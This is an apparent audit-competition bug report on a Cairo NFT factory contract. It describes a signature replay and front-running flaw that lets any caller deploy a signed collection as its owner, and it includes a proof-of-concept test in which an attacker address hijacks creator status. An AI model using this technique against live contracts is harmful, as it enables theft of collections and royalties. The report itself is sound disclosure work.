# 57891 sc medium signature replay lets attackers hijack nft collection deployment

**Submitted on Oct 29th 2025 at 11:39:30 UTC by @spongebob for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57891
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/feat/cairo/src/nftfactory/nftfactory.cairohttps://github.com/immunefi-team/audit-comp-belong/blob/feat/cairo/src/nftfactory/nftfactory.cairo>
* **Impacts:**
  * Unauthorized minting of NFTs

## Description

<https://github.com/immunefi-team/audit-comp-belong/blob/0cbcde6fd80dbc55a9e3403c8e5a74827dea19e2/src/snip12/produce\\_hash.cairo#L5> shows the signed payload commits to the intended `creator_address` (alongside name/symbol/URI/royalty).

During minting the factory recreates that struct from caller-supplied data (<https://github.com/immunefi-team/audit-comp-belong/blob/0cbcde6fd80dbc55a9e3403c8e5a74827dea19e2/src/nftfactory/nftfactory.cairo#L289>) and verifies the signature with the configured signer, but after validation it discards the provided `creator_address` and instead records `get_caller_address()` everywhere the collection ownership matters (<https://github.com/immunefi-team/audit-comp-belong/blob/0cbcde6fd80dbc55a9e3403c8e5a74827dea19e2/src/nftfactory/nftfactory.cairo#L321-L389>).

Because there is no equality check between `info.creator_address` and the transaction sender, any account that learns a valid signature can replay or front-run it, keeping the approved creator value in the struct to pass signature verification while ending up as the on-chain creator/owner. The attacker therefore captures the deployed collection, royalties, and referral attribution which is an unauthorized NFT mint.

## Impact

I consider this a **Critical** impact – it meets the “Unauthorized minting of NFTs” criterion. An attacker can front-run or replay any valid signature to deploy the collection under their address, taking control of the drop and any revenue it generates.

Creators must share their signed payload with the factory (often via a marketplace/backend), so any compromised backend, leaked logs, or even a mempool observer can capture that signature. Because the on-chain check doesn’t tie it to the intended caller, the attacker can immediately replay it, and the factory has no way to distinguish them. No unusual prerequisites or high costs are involved — access to a valid signature is sufficient, so exploitation is practical and expected once signatures are exposed.

## Recommendation

Bind the signature to the intended creator (and optionally replay-protect it). Extend the `ProduceHash` struct and its hash to include the authorized creator address (and any other execution-critical fields like deadline/nonce). Require `_produce` to compare that signed creator with `get_caller_address()` before deploying. This ensures only the signer-authorized account can mint, and prevents front-running/replay by other callers.

## Proof of Concept

Run the diff:

```diff
diff --git a/src/tests/test_nftfactory.cairo b/src/tests/test_nftfactory.cairo
index bd2fda7..a2c5bd7 100644
--- a/src/tests/test_nftfactory.cairo
+++ b/src/tests/test_nftfactory.cairo
@@ -3,7 +3,7 @@ use crate::nftfactory::interface::{
 };
 use crate::nftfactory::nftfactory::{NFTFactory};
 use crate::snip12::produce_hash::{ProduceHash, MessageProduceHash};
-use starknet::ContractAddress;
+use starknet::{ContractAddress, contract_address_const};
 use openzeppelin::{
     utils::{serde::SerializedAppend, bytearray::{ByteArrayExtImpl, ByteArrayExtTrait}},
     access::ownable::interface::{IOwnableDispatcher, IOwnableDispatcherTrait},
@@ -129,6 +129,51 @@ fn sign_message(msg_hash: felt252) -> Array<felt252> {
     return constants::stark::KEY_PAIR().serialized_sign(msg_hash);
 }
 
+#[test]
+fn test_produce_signature_replay_changes_creator() {
+    let signer_account = deploy_account_mock();
+    let factory_address = deploy_initialize(signer_account);
+    let nft_factory = INFTFactoryDispatcher { contract_address: factory_address };
+
+    let intended_creator = constants::CREATOR();
+    let attacker = contract_address_const::<'ATTACKER'>();
+
+    let fraction = 0;
+    let produce_hash = ProduceHash {
+        name_hash: constants::NAME().hash(),
+        symbol_hash: constants::SYMBOL().hash(),
+        contract_uri: constants::CONTRACT_URI().hash(),
+        royalty_fraction: fraction,
+    };
+
+    start_cheat_caller_address_global(signer_account);
+    let signature = sign_message(produce_hash.get_message_hash(factory_address));
+    stop_cheat_caller_address_global();
+
+    let instance_info = InstanceInfo {
+        name: constants::NAME(),
+        symbol: constants::SYMBOL(),
+        contract_uri: constants::CONTRACT_URI(),
+        payment_token: constants::CURRENCY(),
+        royalty_fraction: fraction,
+        transferrable: true,
+        max_total_supply: constants::MAX_TOTAL_SUPPLY(),
+        mint_price: constants::MINT_PRICE(),
+        whitelisted_mint_price: constants::WL_MINT_PRICE(),
+        collection_expires: constants::EXPIRES(),
+        referral_code: '',
+        signature,
+    };
+
+    start_cheat_caller_address(factory_address, attacker);
+    nft_factory.produce(instance_info.clone());
+    stop_cheat_caller_address(factory_address);
+
+    let minted = nft_factory.nftInfo(constants::NAME(), constants::SYMBOL());
+    assert_eq!(minted.creator, attacker);
+    assert_ne!(minted.creator, intended_creator);
+}
+
 #[test]
 fn test_deploy() {
     let contract = deploy();
```
